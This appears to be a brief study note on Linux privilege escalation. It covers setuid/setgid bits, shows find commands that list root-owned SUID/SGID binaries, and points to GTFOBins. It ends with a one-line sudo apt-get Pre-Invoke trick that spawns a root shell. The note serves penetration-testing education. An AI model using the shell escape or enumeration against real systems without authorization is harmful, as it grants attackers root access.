The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.

```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them.

```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

This [resource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) has more information about the `setuid` and `setgid` bits, including how to set the bits.

## GTFOBins

The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files

```shell
 sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
